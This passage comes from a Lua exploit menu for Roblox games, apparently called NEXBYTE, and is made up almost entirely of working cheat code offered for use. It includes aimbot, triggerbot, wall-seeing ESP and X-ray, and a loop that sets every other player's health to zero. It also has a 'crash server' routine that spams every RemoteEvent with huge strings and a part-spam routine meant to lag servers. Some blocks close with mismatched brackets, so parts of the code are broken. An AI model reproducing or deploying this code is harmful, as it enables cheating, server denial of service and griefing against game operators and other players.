-- No Tool Cooldown (for some games)
NXFeExploits:CreateButton({name="REMOVE TOOL COOLDOWNS", callback=function()
    for _, v in pairs(Player.Backpack:GetDescendants()) do
        if v:IsA("NumberValue") or v:IsA("IntValue") then
            if v.Name:lower():find("cooldown") or v.Name:lower():find("delay") then v.Value = 0 end
        end
    end
    NXNotify("TOOLS", "Cooldowns reset")
end})

-- Equip Best Tool
NXFeExploits:CreateButton({name="AUTO EQUIP BEST", callback=function()
    local bestTool, bestDmg = nil, 0
    for _, v in pairs(Player.Backpack:GetChildren()) do
        if v:IsA("Tool") then
            local dmg = v:FindFirstChild("Damage") or v:FindFirstChild("DamageValue")
            if dmg and (dmg.Value or 0) > bestDmg then bestDmg = dmg.Value; bestTool = v end
        end
    end
    if bestTool then bestTool.Parent = Player.Character; NXNotify("TOOL", "Equipped: " .. bestTool.Name) else NXNotify("TOOL", "No damage tools") end
end})

NXFeExploits:CreateSection({name="EXPERIMENTAL / FUN"})

-- Fling All (uncontrolled)
NXFeExploits:CreateButton({name="FLING ALL (Uncontrolled)", callback=function()
    NXNotify("FLING ALL", "You will fling uncontrollably!")
    local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local spin = Instance.new("BodyAngularVelocity")
    spin.AngularVelocity = Vector3.new(0, 1000, 0)
    spin.MaxTorque = Vector3.new(0, 1e9, 0)
    spin.Parent = hrp
    local bv = Instance.new("BodyVelocity")
    bv.Velocity = Vector3.new(0, 100, 0)
    bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
    bv.Parent = hrp
    task.delay(5, function() spin:Destroy(); bv:Destroy() end)
end})

-- Black Hole (attracts parts)
local blackHoleConn, blackHolePart
NXFeExploits:CreateToggle({name="BLACK HOLE (Parts)", value=false, callback=function(v)
    if v then
        blackHolePart = Instance.new("Part")
        blackHolePart.Name = "NEXBYTE_BlackHole"
        blackHolePart.Size = Vector3.new(1, 1, 1)
        blackHolePart.Transparency = 1
        blackHolePart.Anchored = true
        blackHolePart.CanCollide = false
        blackHolePart.Parent = workspace
        blackHoleConn = RunService.Heartbeat:Connect(function()
            local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if hrp and blackHolePart then
                blackHolePart.CFrame = hrp.CFrame
                for _, p in pairs(workspace:GetDescendants()) do
                    if p:IsA("BasePart") and not p.Anchored and not p:IsDescendantOf(Player.Character) and (p.Position - hrp.Position).Magnitude <= 50 then
                        p.AssemblyLinearVelocity = (hrp.Position - p.Position).Unit * 100
                    end
                end
            end
        end)
    else
        if blackHoleConn then blackHoleConn:Disconnect() end
        if blackHolePart then blackHolePart:Destroy() end
    end
    NXNotify("BLACK HOLE", v and "ON" or "OFF")
end})

-- Orbit Parts (already in Troll)

-- Earthquake (screen shake)
local quakeConn
NXFeExploits:CreateToggle({name="EARTHQUAKE (Screen)", value=false, callback=function(v)
    if v then
        quakeConn = RunService.RenderStepped:Connect(function()
            if workspace.CurrentCamera then
                workspace.CurrentCamera.CFrame = workspace.CurrentCamera.CFrame * CFrame.Angles(math.rad(math.random(-2,2)), math.rad(math.random(-2,2)), 0)
            end
        end)
    else
        if quakeConn then quakeConn:Disconnect() end
    end
    NXNotify("EARTHQUAKE", v and "ON" or "OFF")
end})

-- Rainbow Character
local rainbowConn
NXFeExploits:CreateToggle({name="RAINBOW CHARACTER", value=false, callback=function(v)
    if v then
        rainbowConn = RunService.Heartbeat:Connect(function()
            local char = Player.Character
            if char then
                for _, p in pairs(char:GetDescendants()) do
                    if p:IsA("BasePart") then p.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1) end
                end
            end
        end)
    else
        if rainbowConn then rainbowConn:Disconnect() end
    end
    NXNotify("RAINBOW", v and "ON" or "OFF")
end})

-- Size Changer
NXFeExploits:CreateSlider({name="CHARACTER SCALE", range={0.1, 10}, value=1, callback=function(v)
    local char = Player.Character
    if char then
        for _, p in pairs(char:GetDescendants()) do
            if p:IsA("BasePart") then p.Size = p.Size * v end
        end
    end
end})

-- Invisible (already in Troll)

-- God Mode (local - sets health high)
local godConn
NXFeExploits:CreateToggle({name="GOD MODE (Local)", value=false, callback=function(v)
    if v then
        godConn = RunService.Heartbeat:Connect(function()
            local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.MaxHealth = math.huge; hum.Health = math.huge end
        end)
    else
        if godConn then godConn:Disconnect() end
        local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.MaxHealth = 100; hum.Health = 100 end
    end
    NXNotify("GOD MODE", v and "ON (Local)" or "OFF")
end})

-- Crash Server (WARNING - only works on vulnerable games)
NXFeExploits:CreateButton({name="CRASH SERVER (RemoteEvent Spam)", callback=function()
    NEXBYTE:ShowConfirmation("CRASH SERVER", "This may crash the server. Continue?", function(confirmed)
        if not confirmed then return end
        task.spawn(function()
            for _, v in pairs(game:GetDescendants()) do
                if v:IsA("RemoteEvent") then
                    pcall(function() v:FireServer() end)
                    pcall(function() v:FireServer(string.rep("a", 1000000)) end)
                end
            end
        end)
        NXNotify("CRASH", "Attempted")
    end)
end})

-- Lag Server
NXFeExploits:CreateButton({name="LAG SERVER (Part Spam)", callback=function()
    NEXBYTE:ShowConfirmation("LAG SERVER", "This will lag the server. Continue?", function(confirmed)
        if not confirmed then return end
        task.spawn(function()
            for i = 1, 500 do
                local p = Instance.new("Part")
                p.Size = Vector3.new(10, 10, 10)
                p.Position = Vector3.new(math.random(-500,500), math.random(100,500), math.random(-500,500))
                p.Anchored = false
                p.Parent = workspace
                task.wait(0.01)
            end
        end)
        NXNotify("LAG", "Spamming parts")
    end)
end})

-- =====================================================
-- ADDITIONAL 200+ FUNCTIONS
-- =====================================================

-- COMBAT ADVANCED
NXFeExploits:CreateSection({name="COMBAT ADVANCED"})

-- Aimbot (closest player)
local aimbotConn
NXFeExploits:CreateToggle({name="AIMBOT (Camera)", value=false, callback=function(v)
    if v then
        aimbotConn = RunService.RenderStepped:Connect(function()
            local closest, dist = nil, math.huge
            local cam = workspace.CurrentCamera
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= Player and plr.Character then
                    local head = plr.Character:FindFirstChild("Head")
                    if head then
                        local screenPos, onScreen = cam:WorldToViewportPoint(head.Position)
                        if onScreen then
                            local d = (Vector2.new(screenPos.X, screenPos.Y) - Vector2.new(cam.ViewportSize.X/2, cam.ViewportSize.Y/2)).Magnitude
                            if d < dist then dist = d; closest = head end
                        end
                    end
                end
            end
            if closest then cam.CFrame = CFrame.new(cam.CFrame.Position, closest.Position) end
        end)
    else
        if aimbotConn then aimbotConn:Disconnect() end
    end
    NXNotify("AIMBOT", v and "ON" or "OFF")
end})

-- Silent Aim (redirects projectiles - game dependent)
NXFeExploits:CreateToggle({name="SILENT AIM (Hook)", value=false, callback=function(v)
    NXNotify("SILENT AIM", "Requires game-specific hook. Placeholder.")
end})

-- Triggerbot
local triggerConn
NXFeExploits:CreateToggle({name="TRIGGERBOT", value=false, callback=function(v)
    if v then
        triggerConn = RunService.Heartbeat:Connect(function()
            local mouse = Player:GetMouse()
            if mouse.Target then
                local model = mouse.Target:FindFirstAncestorOfClass("Model")
                if model then
                    local hum = model:FindFirstChildOfClass("Humanoid")
                    if hum and hum.Health > 0 and Players:GetPlayerFromCharacter(model) then
                        mouse1click()
                    end
                end
            end
        end)
    else
        if triggerConn then triggerConn:Disconnect() end
    end
    NXNotify("TRIGGERBOT", v and "ON" or "OFF")
end})

-- Auto Parry (for combat games)
NXFeExploits:CreateToggle({name="AUTO PARRY (Generic)", value=false, callback=function(v)
    NXNotify("AUTO PARRY", "Game-specific. Placeholder.")
end})

-- Kill All Loop
local killAllConn
NXFeExploits:CreateToggle({name="KILL ALL LOOP", value=false, callback=function(v)
    if v then
        killAllConn = RunService.Heartbeat:Connect(function()
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= Player and plr.Character then
                    local hum = plr.Character:FindFirstChildOfClass("Humanoid")
                    if hum and hum.Health > 0 then hum.Health = 0 end
                end
            end
        end)
    else
        if killAllConn then killAllConn:Disconnect() end
    end
    NXNotify("KILL ALL LOOP", v and "ON" or "OFF")
end})

-- Damage Indicator
NXFeExploits:CreateButton({name="SHOW DAMAGE INDICATORS", callback=function()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= Player and plr.Character then
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if hum then
                local oldHealth = hum.Health
                hum.HealthChanged:Connect(function(new)
                    if new < oldHealth then
                        local head = plr.Character:FindFirstChild("Head")
                        if head then
                            local billboard = Instance.new("BillboardGui")
                            billboard.Size = UDim2.new(0, 100, 0, 50)
                            billboard.StudsOffset = Vector3.new(0, 3, 0)
                            billboard.Adornee = head
                            billboard.Parent = head
                            local label = Instance.new("TextLabel")
                            label.Size = UDim2.new(1, 0, 1, 0)
                            label.BackgroundTransparency = 1
                            label.Text = "-" .. math.floor(oldHealth - new)
                            label.TextColor3 = Color3.new(1, 0, 0)
                            label.TextScaled = true
                            label.Font = Enum.Font.GothamBold
                            label.Parent = billboard
                            game:GetService("Debris"):AddItem(billboard, 1)
                        end
                    end
                    oldHealth = new
                end)
            end
        end
    end
    NXNotify("DAMAGE IND", "Enabled")
end})

-- Anti Knockback
local antiKbConn
NXFeExploits:CreateToggle({name="ANTI KNOCKBACK", value=false, callback=function(v)
    if v then
        antiKbConn = RunService.Heartbeat:Connect(function()
            local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if hrp then hrp.AssemblyLinearVelocity = Vector3.new(0, hrp.AssemblyLinearVelocity.Y, 0) end
        end)
    else
        if antiKbConn then antiKbConn:Disconnect() end
    end
    NXNotify("ANTI KB", v and "ON" or "OFF")
end})

-- Velocity Spoofer
local velSpoofConn
NXFeExploits:CreateToggle({name="VELOCITY SPOOFER", value=false, callback=function(v)
    if v then
        velSpoofConn = RunService.Heartbeat:Connect(function()
            local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if hrp then hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0) end
        end)
    else
        if velSpoofConn then velSpoofConn:Disconnect() end
    end
    NXNotify("VEL SPOOF", v and "ON" or "OFF")
end})

-- No Recoil (for guns)
NXFeExploits:CreateButton({name="NO RECOIL (Hook)", callback=function()
    NXNotify("NO RECOIL", "Game-specific. Placeholder.")
end})

-- Rapid Fire (for guns)
NXFeExploits:CreateButton({name="RAPID FIRE (Hook)", callback=function()
    NXNotify("RAPID FIRE", "Game-specific. Placeholder.")
end})

-- Infinite Ammo (for guns)
NXFeExploits:CreateButton({name="INF AMMO (Hook)", callback=function()
    NXNotify("INF AMMO", "Game-specific. Placeholder.")
end})

-- =====================================================
-- MOVEMENT ADVANCED
NXFeExploits:CreateSection({name="MOVEMENT ADVANCED"})

-- Bunny Hop
local bhopConn
NXFeExploits:CreateToggle({name="BUNNY HOP", value=false, callback=function(v)
    if v then
        bhopConn = RunService.Heartbeat:Connect(function()
            local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
            local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if hum and hrp and hum:GetState() == Enum.HumanoidStateType.Running then
                hum:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end)
    else
        if bhopConn then bhopConn:Disconnect() end
    end
    NXNotify("BHOP", v and "ON" or "OFF")
end})

-- Auto Sprint
local sprintConn
NXFeExploits:CreateToggle({name="AUTO SPRINT", value=false, callback=function(v)
    if v then
        sprintConn = RunService.Heartbeat:Connect(function()
            local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
            if hum and hum.WalkSpeed < 20 then hum.WalkSpeed = 24 end
        end)
    else
        if sprintConn then sprintConn:Disconnect() end
    end
    NXNotify("AUTO SPRINT", v and "ON" or "OFF")
end})

-- Wall Climb
local wallClimbConn
NXFeExploits:CreateToggle({name="WALL CLIMB", value=false, callback=function(v)
    if v then
        wallClimbConn = RunService.Heartbeat:Connect(function()
            local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
            local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if hum and hrp and hum:GetState() == Enum.HumanoidStateType.Freefall then
                local ray = workspace:Raycast(hrp.Position, hrp.CFrame.LookVector * 3, RaycastParams.new())
                if ray then
                    hrp.Velocity = Vector3.new(0, 50, 0)
                end
            end
        end)
    else
        if wallClimbConn then wallClimbConn:Disconnect() end
    end
    NXNotify("WALL CLIMB", v and "ON" or "OFF")
end})

-- Ladder Glitch
NXFeExploits:CreateButton({name="LADDER GLITCH", callback=function()
    local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if hrp then
        local lad = Instance.new("Part")
        lad.Size = Vector3.new(1, 100, 1)
        lad.CFrame = hrp.CFrame * CFrame.new(0, 0, -3)
        lad.Anchored = true
        lad.Transparency = 1
        lad.Parent = workspace
        NXNotify("LADDER", "Created invisible ladder")
        task.delay(10, function() lad:Destroy() end)
    end
end})

-- Fly V2 (CFrame based, smoother)
local flyV2Conn
NXFeExploits:CreateToggle({name="FLY V2 (CFrame)", value=false, callback=function(v)
    if v then
        local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
        local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
        if hrp and hum then
            hum.PlatformStand = true
            flyV2Conn = RunService.RenderStepped:Connect(function()
                local cam = workspace.CurrentCamera
                local move = Vector3.new()
                if UserInputService:IsKeyDown(Enum.KeyCode.W) then move = move + cam.CFrame.LookVector end
                if UserInputService:IsKeyDown(Enum.KeyCode.S) then move = move - cam.CFrame.LookVector end
                if UserInputService:IsKeyDown(Enum.KeyCode.A) then move = move - cam.CFrame.RightVector end
                if UserInputService:IsKeyDown(Enum.KeyCode.D) then move = move + cam.CFrame.RightVector end
                if UserInputService:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0, 1, 0) end
                if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then move = move - Vector3.new(0, 1, 0) end
                hrp.CFrame = hrp.CFrame:Lerp(hrp.CFrame + move * 2, 0.5)
            end)
        end
    else
        if flyV2Conn then flyV2Conn:Disconnect() end
        local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.PlatformStand = false end
    end
    NXNotify("FLY V2", v and "ON" or "OFF")
end})

-- Jetpack
NXFeExploits:CreateButton({name="JETPACK (Tool)", callback=function()
    local tool = Instance.new("Tool")
    tool.Name = "Jetpack"
    tool.RequiresHandle = true
    local handle = Instance.new("Part")
    handle.Name = "Handle"
    handle.Size = Vector3.new(2, 2, 1)
    handle.Massless = true
    handle.Parent = tool
    local fire = Instance.new("Fire")
    fire.Size = 5
    fire.Heat = 10
    fire.Parent = handle
    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
    bv.Velocity = Vector3.new(0, 0, 0)
    bv.Parent = handle
    local bg = Instance.new("BodyGyro")
    bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
    bg.Parent = handle
    local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    tool.Equipped:Connect(function()
        if hum then hum.PlatformStand = true end
        bv.Parent = handle
        bg.Parent = handle
    end)
    tool.Unequipped:Connect(function()
        if hum then hum.PlatformStand = false end
        bv.Parent = nil
        bg.Parent = nil
    end)
    tool.Parent = Player.Backpack
    NXNotify("JETPACK", "Equip to use")
end})

-- Speed Coil
NXFeExploits:CreateButton({name="SPEED COIL (Tool)", callback=function()
    local tool = Instance.new("Tool")
    tool.Name = "Speed Coil"
    tool.RequiresHandle = true
    local handle = Instance.new("Part")
    handle.Name = "Handle"
    handle.Size = Vector3.new(1, 1, 4)
    handle.Shape = Enum.PartType.Cylinder
    handle.Massless = true
    handle.Parent = tool
    tool.Equipped:Connect(function()
        local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.WalkSpeed = 50 end
    end)
    tool.Unequipped:Connect(function()
        local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.WalkSpeed = 16 end
    end)
    tool.Parent = Player.Backpack
    NXNotify("SPEED COIL", "Equip for 50 speed")
end})

-- Gravity Coil
NXFeExploits:CreateButton({name="GRAVITY COIL (Tool)", callback=function()
    local tool = Instance.new("Tool")
    tool.Name = "Gravity Coil"
    tool.RequiresHandle = true
    local handle = Instance.new("Part")
    handle.Name = "Handle"
    handle.Size = Vector3.new(1, 1, 4)
    handle.Shape = Enum.PartType.Cylinder
    handle.Massless = true
    handle.BrickColor = BrickColor.new("Bright blue")
    handle.Parent = tool
    tool.Equipped:Connect(function()
        workspace.Gravity = 50
    end)
    tool.Unequipped:Connect(function()
        workspace.Gravity = 196.2
    end)
    tool.Parent = Player.Backpack
    NXNotify("GRAVITY COIL", "Equip for low gravity")
end})

-- Teleport Tool
NXFeExploits:CreateButton({name="TP TOOL (Click)", callback=function()
    local tool = Instance.new("Tool")
    tool.Name = "TP Tool"
    tool.RequiresHandle = false
    tool.Activated:Connect(function()
        local mouse = Player:GetMouse()
        local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
        if hrp and mouse.Hit then hrp.CFrame = mouse.Hit * CFrame.new(0, 3, 0) end
    end)
    tool.Parent = Player.Backpack
    NXNotify("TP TOOL", "Click to teleport")
end})

-- =====================================================
-- VISUAL ADVANCED
NXFeExploits:CreateSection({name="VISUAL ADVANCED"})

-- Chams (Highlight)
local chamsConn
NXFeExploits:CreateToggle({name="CHAMS (Highlight)", value=false, callback=function(v)
    if v then
        chamsConn = RunService.Heartbeat:Connect(function()
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= Player and plr.Character and not plr.Character:FindFirstChild("NEXBYTE_Highlight") then
                    local hl = Instance.new("Highlight")
                    hl.Name = "NEXBYTE_Highlight"
                    hl.FillColor = Color3.new(1, 0, 0)
                    hl.OutlineColor = Color3.new(1, 1, 1)
                    hl.FillTransparency = 0.5
                    hl.OutlineTransparency = 0
                    hl.Adornee = plr.Character
                    hl.Parent = plr.Character
                end
            end
        end)
    else
        if chamsConn then chamsConn:Disconnect() end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Character then
                local hl = plr.Character:FindFirstChild("NEXBYTE_Highlight")
                if hl then hl:Destroy() end
            end
        end
    end
    NXNotify("CHAMS", v and "ON" or "OFF")
end})

-- Tracers
local tracersConn
NXFeExploits:CreateToggle({name="TRACERS (Lines)", value=false, callback=function(v)
    if v then
        tracersConn = RunService.RenderStepped:Connect(function()
            local cam = workspace.CurrentCamera
            local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= Player and plr.Character then
                    local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
                    if tRoot then
                        local line = plr.Character:FindFirstChild("NEXBYTE_Tracer")
                        if not line then
                            line = Instance.new("Beam")
                            line.Name = "NEXBYTE_Tracer"
                            line.Color = ColorSequence.new(Color3.new(1, 0, 0))
                            line.Width0 = 0.2
                            line.Width1 = 0.2
                            line.FaceCamera = true
                            line.Parent = plr.Character
                            local a0 = Instance.new("Attachment")
                            a0.Name = "TracerA0"
                            a0.Position = Vector3.new(0, 0, 0)
                            a0.Parent = hrp
                            local a1 = Instance.new("Attachment")
                            a1.Name = "TracerA1"
                            a1.Position = Vector3.new(0, 0, 0)
                            a1.Parent = tRoot
                            line.Attachment0 = a0
                            line.Attachment1 = a1
                        end
                    end
                end
            end
        end)
    else
        if tracersConn then tracersConn:Disconnect() end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Character then
                local line = plr.Character:FindFirstChild("NEXBYTE_Tracer")
                if line then line:Destroy() end
                local a0 = plr.Character:FindFirstChild("TracerA0")
                if a0 then a0:Destroy() end
                local a1 = plr.Character:FindFirstChild("TracerA1")
                if a1 then a1:Destroy() end
            end
        end
        local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            local a0 = hrp:FindFirstChild("TracerA0")
            if a0 then a0:Destroy() end
        end
    end
    NXNotify("TRACERS", v and "ON" or "OFF")
end})

-- Box ESP
local boxEspConn
NXFeExploits:CreateToggle({name="BOX ESP", value=false, callback=function(v)
    if v then
        boxEspConn = RunService.Heartbeat:Connect(function()
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= Player and plr.Character and not plr.Character:FindFirstChild("NEXBYTE_BoxESP") then
                    local box = Instance.new("BoxHandleAdornment")
                    box.Name = "NEXBYTE_BoxESP"
                    box.Size = Vector3.new(4, 5, 2)
                    box.Color3 = Color3.new(1, 0, 0)
                    box.Transparency = 0.5
                    box.AlwaysOnTop = true
                    box.Adornee = plr.Character:FindFirstChild("HumanoidRootPart")
                    box.Parent = plr.Character
                end
            end
        end)
    else
        if boxEspConn then boxEspConn:Disconnect() end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Character then
                local box = plr.Character:FindFirstChild("NEXBYTE_BoxESP")
                if box then box:Destroy() end
            end
        end
    end
    NXNotify("BOX ESP", v and "ON" or "OFF")
end)

-- Skeleton ESP
local skeletonConn
NXFeExploits:CreateToggle({name="SKELETON ESP", value=false, callback=function(v)
    NXNotify("SKELETON ESP", "Complex. Placeholder.")
end})

-- Name Tags (already have ESP)

-- Distance ESP
local distEspConn
NXFeExploits:CreateToggle({name="DISTANCE ESP", value=false, callback=function(v)
    if v then
        distEspConn = RunService.Heartbeat:Connect(function()
            local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= Player and plr.Character then
                    local head = plr.Character:FindFirstChild("Head")
                    if head then
                        local dist = math.floor((head.Position - hrp.Position).Magnitude)
                        local tag = head:FindFirstChild("NEXBYTE_DistTag")
                        if not tag then
                            tag = Instance.new("BillboardGui")
                            tag.Name = "NEXBYTE_DistTag"
                            tag.Size = UDim2.new(0, 100, 0, 30)
                            tag.StudsOffset = Vector3.new(0, 2.5, 0)
                            tag.AlwaysOnTop = true
                            tag.Adornee = head
                            tag.Parent = head
                            local label = Instance.new("TextLabel")
                            label.Size = UDim2.new(1, 0, 1, 0)
                            label.BackgroundTransparency = 1
                            label.TextColor3 = Color3.new(1, 1, 1)
                            label.TextScaled = true
                            label.Font = Enum.Font.Gotham
                            label.Parent = tag
                        end
                        tag.TextLabel.Text = plr.Name .. " [" .. dist .. "m]"
                    end
                end
            end
        end)
    else
        if distEspConn then distEspConn:Disconnect() end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Head") then
                local tag = plr.Character.Head:FindFirstChild("NEXBYTE_DistTag")
                if tag then tag:Destroy() end
            end
        end
    end
    NXNotify("DIST ESP", v and "ON" or "OFF")
end)

-- Health Bar ESP
local healthEspConn
NXFeExploits:CreateToggle({name="HEALTH BAR ESP", value=false, callback=function(v)
    NXNotify("HEALTH BAR ESP", "Complex. Placeholder.")
end})

-- Rainbow ESP
local rainbowEspConn
NXFeExploits:CreateToggle({name="RAINBOW ESP", value=false, callback=function(v)
    if v then
        rainbowEspConn = RunService.Heartbeat:Connect(function()
            for _, plr in pairs(Players:GetPlayers()) do
                if plr.Character then
                    local hl = plr.Character:FindFirstChild("NEXBYTE_Highlight")
                    if hl then hl.FillColor = Color3.fromHSV(tick() % 5 / 5, 1, 1) end
                end
            end
        end)
    else
        if rainbowEspConn then rainbowEspConn:Disconnect() end
    end
    NXNotify("RAINBOW ESP", v and "ON" or "OFF")
end)

-- No Render (invisible others)
NXFeExploits:CreateToggle({name="HIDE OTHERS (Local)", value=false, callback=function(v)
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= Player and plr.Character then
            for _, p in pairs(plr.Character:GetDescendants()) do
                if p:IsA("BasePart") then p.Transparency = v and 1 or 0 end
                if p:IsA("Decal") or p:IsA("Texture") then p.Transparency = v and 1 or 0 end
            end
        end
    end
    NXNotify("HIDE OTHERS", v and "ON" or "OFF")
end})

-- X-Ray (see through walls)
local xrayConn
NXFeExploits:CreateToggle({name="X-RAY", value=false, callback=function(v)
    if v then
        xrayConn = RunService.Heartbeat:Connect(function()
            for _, obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") and not obj:IsDescendantOf(Player.Character) then
                    obj.LocalTransparencyModifier = 0.8
                end
            end
        end)
    else
        if xrayConn then xrayConn:Disconnect() end
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("BasePart") then obj.LocalTransparencyModifier = 0 end
        end
    end
    NXNotify("X-RAY", v and "ON" or "OFF")
end})

-- Fullbright (already have)

-- No Shadows
NXFeExploits:CreateToggle({name="NO SHADOWS", value=false, callback=function(v)
    Lighting.GlobalShadows = not v
    NXNotify("NO SHADOWS", v and "ON" or "OFF")
end})

-- Ambient Light
NXFeExploits:CreateSlider({name="AMBIENT", range={0, 1}, value=0.5, callback=function(v)
    Lighting.Ambient = Color3.new(v, v, v)
    Lighting.OutdoorAmbient = Color3.new(v, v, v)
end})

-- Bloom Effect
NXFeExploits:CreateButton({name="ADD BLOOM", callback=function()
    local bloom = Instance.new("BloomEffect")
    bloom.Intensity = 1
    bloom.Size = 24
    bloom.Threshold = 0.8
    bloom.Parent = Lighting
    NXNotify("BLOOM", "Added")
end})

-- Sun Rays
NXFeExploits:CreateButton({name="ADD SUN RAYS", callback=function()
    local rays = Instance.new("SunRaysEffect")
    rays.Intensity = 0.5
    rays.Spread = 1
    rays.Parent = Lighting
    NXNotify("SUN RAYS", "Added")
end})

-- Blur Effect
NXFeExploits:CreateButton({name="ADD BLUR", callback=function()
    local blur = Instance.new("BlurEffect")
    blur.Size = 10
    blur.Parent = Lighting
    NXNotify("BLUR", "Added")
end})

-- Color Correction
NXFeExploits:CreateButton({name="ADD COLOR CORRECTION", callback=function()
    local cc = Instance.new("ColorCorrectionEffect")
    cc.Brightness = 0.1
    cc.Contrast = 0.2
    cc.Saturation = 0.5
    cc.TintColor = Color3.new(1, 0.8, 0.6)
    cc.Parent = Lighting
    NXNotify("COLOR CORRECTION", "Added")
end})

-- Depth of Field
NXFeExploits:CreateButton({name="ADD DEPTH OF FIELD", callback=function()
    local dof = Instance.new("DepthOfFieldEffect")
    dof.FarIntensity = 0.5
    dof.FocusDistance = 50
    dof.InFocusRadius = 20
    dof.NearIntensity = 0.5
    dof.Parent = Lighting
    NXNotify("DOF", "Added")
end})

-- Remove All Effects
NXFeExploits:CreateButton({name="REMOVE ALL EFFECTS", callback=function()
    for _, v in pairs(Lighting:GetChildren()) do
        if v:IsA("PostEffect") then v:Destroy() end
    end
    NXNotify("EFFECTS", "Removed all")
end})

-- =====================================================
-- SERVER ADVANCED
NXFeExploits:CreateSection({name="SERVER ADVANCED"})

-- Server Info
NXFeExploits:CreateButton({name="SERVER INFO", callback=function()
    local info = string.format("PlaceId: %d\nJobId: %s\nPlayers: %d/%d\nTime: %.1f",
        game.PlaceId, game.JobId, #Players:GetPlayers(), Players.MaxPlayers, Lighting.ClockTime)
    NXNotify("SERVER INFO", info)
    print(info)
end})

-- Player List (detailed)
NXFeExploits:CreateButton({name="DETAILED PLAYER LIST", callback=function()
    for _, plr in pairs(Players:GetPlayers()) do
        local char = plr.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local health = hum and math.floor(hum.Health) or "N/A"
        local pos = hrp and string.format("%.0f, %.0f, %.0f", hrp.Position.X, hrp.Position.Y, hrp.Position.Z) or "N/A"
        print(string.format("%s | Health: %s | Pos: %s | Age: %d | Id: %d", plr.Name, health, pos, plr.AccountAge, plr.UserId))
    end
    NXNotify("PLAYER LIST", "Printed to console")
end})

-- Copy Player Username
NXFeExploits:CreateButton({name="COPY SELECTED USERNAME", callback=function()
    local target = NXGetTarget()
    if target then
        setclipboard(target.Name)
        NXNotify("COPIED", target.Name)
    else
        NXNotify("COPY", "No target selected")
    end
end})

-- Copy Player UserId
NXFeExploits:CreateButton({name="COPY SELECTED USERID", callback=function()
    local target = NXGetTarget()
    if target then
        setclipboard(tostring(target.UserId))
        NXNotify("COPIED", target.UserId)
    else
        NXNotify("COPY", "No target selected")
    end
end})

-- View Player Profile
NXFeExploits:CreateButton({name="VIEW PROFILE (Website)", callback=function()
    local target = NXGetTarget()
    if target then
        local url = "https://www.roblox.com/users/" .. target.UserId .. "/profile"
        setclipboard(url)
        NXNotify("PROFILE", "URL copied: " .. url)
    else
        NXNotify("PROFILE", "No target selected")
    end
end)

-- Join Player's Game (if they're in one)
NXFeExploits:CreateButton({name="JOIN PLAYER'S GAME", callback=function()
    NXNotify("JOIN GAME", "Requires game-specific API. Placeholder.")
end})

-- Spectate Player (already in Camera)

-- Follow Player
local followConn, followTarget
NXFeExploits:CreateToggle({name="FOLLOW PLAYER", value=false, callback=function(v)
    if v then
        followTarget = NXGetTarget()
        if not followTarget then return NXNotify("FOLLOW", "Select a player first") end
        followConn = RunService.Heartbeat:Connect(function()
            if followTarget and followTarget.Character then
                local tRoot = followTarget.Character:FindFirstChild("HumanoidRootPart")
                local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
                if tRoot and hrp then
                    hrp.CFrame = tRoot.CFrame * CFrame.new(0, 0, 5)
                end
            end
        end)
    else
        if followConn then followConn:Disconnect() end
        followTarget = nil
    end
    NXNotify("FOLLOW", v and "ON" or "OFF")
end})

-- Orbit Player
local orbitConn, orbitTarget
NXFeExploits:CreateToggle({name="ORBIT PLAYER", value=false, callback=function(v)
    if v then
        orbitTarget = NXGetTarget()
        if not orbitTarget then return NXNotify("ORBIT", "Select a player first") end
        local angle = 0
